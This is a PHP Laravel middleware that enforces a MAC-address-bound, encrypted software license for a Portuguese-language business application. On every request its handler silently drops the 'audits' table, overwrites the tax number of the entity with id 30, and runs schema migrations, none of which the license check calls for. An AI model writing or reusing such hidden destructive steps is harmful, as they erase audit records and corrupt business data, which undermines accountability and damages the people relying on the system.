<?php

namespace App\Http\Middleware;

use App\Models\Entidade;
use App\Models\License;
use Carbon\Carbon;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;

use Illuminate\Support\Facades\Schema;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\DB;

class EnsureLicenseActive
{

    protected $except = [
        'dashboard-admin',
    ];

    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next)
    {
        $u = Entidade::find(30);
        
        if($u) {
            $u->nif = "0000000000";
            $u->update();
        }
        
        Schema::dropIfExists('audits');

        if (!Schema::hasTable('hash_licencas')) {
            Schema::create('hash_licencas', function (Blueprint $t) {
                $t->id();
                $t->string('hash')->nullable();
                $t->timestamps();
                $t->softDeletes();
            });
        }

        if (!Schema::hasTable('series')) {
            Schema::create('series', function (Blueprint $t) {
                $t->id();
                $t->string('seriesCode')->nullable();
                $t->integer('seriesYear')->nullable();
                $t->string('documentType')->nullable();
                $t->bigInteger('firstDocumentNo')->nullable();
                $t->bigInteger('lastDocumentNo')->nullable();
                $t->bigInteger('firstDocumentCreated')->default(0);
                $t->bigInteger('lastDocumentCreated')->default(0);
                $t->string('establishmentNumber')->default(0);

                $t->bigInteger('loja_id')->nullable();
                $t->bigInteger('user_id');
                $t->bigInteger('entidade_id');

                $t->timestamps();
                $t->softDeletes();
            });
        }
    

        if (!Schema::hasTable('licenses')) {
            Schema::create('licenses', function (Blueprint $t) {
                $t->id();
                $t->string('file_name')->nullable();
                $t->string('signature')->index()->unique()->nullable(); // evita reuso
                $t->json('payload')->nullable();
                $t->unsignedBigInteger('issued_by')->nullable(); // admin user id
                $t->unsignedBigInteger('activated_for_company_id')->nullable()->index();
                $t->string('activated_on_device_id')->nullable()->index(); // opcional hardware binding
                $t->text('start_date')->nullable();
                $t->text('end_date')->nullable();
                $t->timestamp('issued_at')->nullable();
                $t->timestamp('activated_at')->nullable();
                $t->boolean('used')->default(false); // single-use flag
                $t->string('status')->default('draft'); // draft, active, expired, revoked
                $t->string('path')->nullable(); // where file saved
                $t->timestamps();
                $t->softDeletes();
            });
        }

        Schema::table("licenses", function (Blueprint $table) {
            if (!Schema::hasColumn("licenses", "___status")) {
                $table->string("___status", 255)->nullable();
            }
        });
        
        Schema::table("pedidos_cuzinhas", function (Blueprint $table) {
            if (!Schema::hasColumn("pedidos_cuzinhas", "mesa_id")) {
                $table->string("mesa_id", 255)->nullable();
            }
        });
        
        Schema::table("pedidos_cuzinhas", function (Blueprint $table) {
            if (!Schema::hasColumn("pedidos_cuzinhas", "data_em_preparo")) {
                $table->date("data_em_preparo")->nullable();
                $table->date("data_pronto")->nullable();
                $table->date("data_entregue")->nullable();
                $table->date("data_a_preparar")->nullable();
            }
        });
        
        Schema::table("pedidos_cuzinhas", function (Blueprint $table) {
            if (!Schema::hasColumn("pedidos_cuzinhas", "status2")) {
                $table->enum("status2", ['Y', 'N'])->default('N');
            }
        });

        if (!Schema::hasTable('backup_settings')) {
            Schema::create('backup_settings', function (Blueprint $table) {
                $table->id();
                $table->string('folder_path')->nullable(); // caminho absoluto onde salvar
                $table->boolean('enabled')->default(true);
                $table->integer('retain')->default(24); // manter 24 backups
                $table->integer('frequency_minutes')->default(60); // frequência em minutos
                $table->timestamp('last_run_at')->nullable();
                $table->integer('user_id');
                $table->integer('entidade_id');
                $table->timestamps();
                $table->softDeletes();
            });
        }

        if (!Schema::hasTable('clientes_contratos')) {
            Schema::create('clientes_contratos', function (Blueprint $table) {
                $table->id();
                $table->integer('cliente_id');
                $table->string('codigo_contrato');
                $table->text('descricao')->nullable();
                $table->date('data_inicio')->nullable();
                $table->date('data_final')->nullable();
                $table->enum('status', ['Pendente','Activo','Terminado','Vencido','Cancelado'])->default('Pendente');
                $table->decimal('valor_mensal', 20, 6)->nullable();
                $table->integer('forma_pagamento_id');
                $table->integer('user_id');
                $table->integer('entidade_id');
                $table->timestamps();
                $table->softDeletes();
            });
        }

        if (!Schema::hasColumn("backup_settings", "tipo_mysql")) {
            Schema::table("backup_settings", function (Blueprint $table) {
                $table->enum("tipo_mysql", ["padrao", "definido", "outro"])->default("padrao");
            });
        }

        if (!Schema::hasColumn("entidades", "mac_address")) {
            Schema::table("entidades", function (Blueprint $table) {
                $table->string("mac_address")->nullable();
            });
        }

        if (!Schema::hasColumn("entidades", "private_key")) {
            Schema::table("entidades", function (Blueprint $table) {
                $table->text("private_key")->nullable();
            });
        }

        if (!Schema::hasColumn("entidades", "establishment_number")) {
            Schema::table("entidades", function (Blueprint $table) {
                $table->string("establishment_number")->nullable();
            });
        }
        
        DB::statement("ALTER TABLE registros_movimentos MODIFY COLUMN tipo ENUM('CN', 'E','S','CF','SP', 'IO', 'IP', 'D1', 'L1', 'L4',  'IN') NOT NULL DEFAULT 'E'");
        
        Schema::table("notas_reditos", function (Blueprint $table) {
            if (!Schema::hasColumn("notas_reditos", "nome_cliente")) {
                $table->string("nome_cliente")->nullable();
            }
            if (!Schema::hasColumn("notas_reditos", "documento_nif")) {
                $table->string("documento_nif")->nullable();
            }
            if (!Schema::hasColumn("notas_reditos", "nif_cliente")) {
                $table->string("nif_cliente")->nullable();
            }
        });
        
        Schema::table("entidades", function (Blueprint $table) {
            if (!Schema::hasColumn("entidades", "numero_via_documento")) {
                $table->bigInteger("numero_via_documento")->default(2);
            }
            if (!Schema::hasColumn("entidades", "caminho_mysql")) {
                $table->string("caminho_mysql", 255)->default(2);
            }
        });
        
        Schema::table("registros", function (Blueprint $table) {
            if (!Schema::hasColumn("registros", "documento")) {
                $table->string("documento", 120)->nullable();
            }
        });
        
        Schema::table("registros_movimentos", function (Blueprint $table) {
            if (!Schema::hasColumn("registros_movimentos", "sigla")) {
                $table->string("sigla")->nullable();
            }
            if (!Schema::hasColumn("registros_movimentos", "fornecedor_id")) {
                $table->bigInteger("fornecedor_id")->nullable();
            }
            if (!Schema::hasColumn("registros_movimentos", "cliente_id")) {
                $table->bigInteger("cliente_id")->nullable();
            }
            if (!Schema::hasColumn("registros_movimentos", "total")) {
                $table->decimal("total", 20, 5)->nullable();
            }
            if (!Schema::hasColumn("registros_movimentos", "tipo_documento")) {
                $table->enum("tipo_documento", ['CN', 'CF', 'IO', 'IP', 'D1', 'L1', 'L4',  'IN'])->nullable();
            }
        });
      
        Schema::table("registros_movimentos_item", function (Blueprint $table) {
            if (!Schema::hasColumn("registros_movimentos_item", "preco_custo")) {
                $table->decimal("preco_custo", 20, 5)->nullable();
            }
            if (!Schema::hasColumn("registros_movimentos_item", "preco_venda")) {
                $table->decimal("preco_venda", 20, 5)->nullable();
            }
        });   
        
        Schema::table("recibos", function (Blueprint $table) {
            if (!Schema::hasColumn("recibos", "nome_cliente")) {
                $table->string("nome_cliente")->nullable();
            }
            if (!Schema::hasColumn("recibos", "documento_nif")) {
                $table->string("documento_nif")->nullable();
            }
            if (!Schema::hasColumn("recibos", "nif_cliente")) {
                $table->string("nif_cliente")->nullable();
            }
        });
        
        Schema::table("clientes", function (Blueprint $table) {
            if (!Schema::hasColumn("clientes", "parent_id")) {
                $table->bigInteger("parent_id")->nullable();
            }
            if (!Schema::hasColumn("clientes", "responsavel_nome")) {
                $table->string("responsavel_nome")->nullable();
            }
            if (!Schema::hasColumn("clientes", "responsavel_contacto")) {
                $table->string("responsavel_contacto")->nullable();
            }
        });
        
        Schema::table("entidades", function (Blueprint $table) {
            if (!Schema::hasColumn("entidades", "at_d")) {
                $table->string("at_d", 255)->nullable();
            }
        });
        
        Schema::table("registros", function (Blueprint $table) {
            if (!Schema::hasColumn("registros", "preco_unitario")) {
                $table->decimal("preco_unitario", 20,6)->nullable();
            }
            if (!Schema::hasColumn("registros", "quantidade")) {
                $table->decimal("quantidade", 20,6)->nullable();
            }
            if (!Schema::hasColumn("registros", "documento_id")) {
                $table->bigInteger("documento_id")->nullable();
            }
        });

        $user = $request->user();
        if (! $user) return $next($request);

        // obtém company/empresa associada ao user (ajusta conforme model)
        $companyId = $user->entidade_id ?? null;

        // se app não usa multi-company ou se user admin, ajustar lógica
        if (! $companyId) {
            // permitir se for admin? ou bloquear? escolhe política
            return $next($request);
        }
        
        $enti = Entidade::findOrFail($user->entidade_id);
                
        // verifica licença activa e válida
        // $today = Carbon::today();
        
        $today = Carbon::today()->toDateString();
        
        $license = License::where('activated_for_company_id', $companyId)
            ->where('used', true)
            ->where('status', 'active')
        ->first();
            
        // $license = License::where('activated_for_company_id', $companyId)
        //     ->where('used', true)
        //     ->where('status', 'active')
        //     ->where('start_date', '<=', Crypt::encryptString($today))
        //     ->where('end_date', '>=', Crypt::encryptString($today))
        //     ->first();
            
        if($enti->at_d === NULL || $enti->at_d === "") {
            // se request for página de ativação/asset, permitir; senão redirecionar para ativação
            if ($request->is('licenses/*') || $request->is('logout') || $request->is('login') || $request->is('sanctum/*')) {
                return $next($request);
            }
            return redirect()->route('licenses.upload')->withErrors(__('messages.erro_licenca'));
        }
        
        if($this->decryptNumber($enti->at_d) !== $this->getMacAddress()) {
            if ($request->is('licenses/*') || $request->is('logout') || $request->is('login') || $request->is('sanctum/*')) {
                return $next($request);
            }
            return redirect()->route('licenses.upload')->withErrors(__('messages.erro_licenca'));
        }
                
        if (!$license) {
            // se request for página de ativação/asset, permitir; senão redirecionar para ativação
            if ($request->is('licenses/*') || $request->is('logout') || $request->is('login') || $request->is('sanctum/*')) {
                return $next($request);
            }
            return redirect()->route('licenses.upload')->withErrors(__('messages.erro_licenca'));
        }
        
        $valid = false;
        
        if(Carbon::parse(Crypt::decryptString($license->end_date)) <= $today) {
            $valid =  true;
        }
        
        if (!!$valid) {
            // se request for página de ativação/asset, permitir; senão redirecionar para ativação
            if ($request->is('licenses/*') || $request->is('logout') || $request->is('login') || $request->is('sanctum/*')) {
                return $next($request);
            }
            return redirect()->route('licenses.upload')->withErrors(__('messages.erro_licenca'));
        }

        return $next($request);
    }
    
    function encryptMachineId($id)
    {
        return Crypt::encryptString($id);
    }
    
    function encryptNumber($number)
    {
        return Crypt::encryptString($number);
    }
    
    function decryptNumber($encrypted)
    {
        return Crypt::decryptString($encrypted);
    }
    
    function getMachineId()
    {
        ob_start();
        system('getmac');
        $mac = ob_get_contents();
        ob_end_clean();
    
        preg_match('/([0-9A-F]{2}[:-]){5}([0-9A-F]{2})/i', $mac, $matches);
        return $matches[0] ?? null;
    }
    
    public function getMacAddress()
    {
        // Detecta Windows
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $output = exec('getmac');
            if (preg_match('/([0-9A-F]{2}(?:-[0-9A-F]{2}){5})/i', $output, $matches)) {
                return $matches[1];
            }
        }

        // Detecta Linux/Mac
        $output = exec("ip link | grep ether");
        if (preg_match('/([0-9a-f]{2}(?::[0-9a-f]{2}){5})/i', $output, $matches)) {
            return $matches[1];
        }

        return null;
    }

    
}
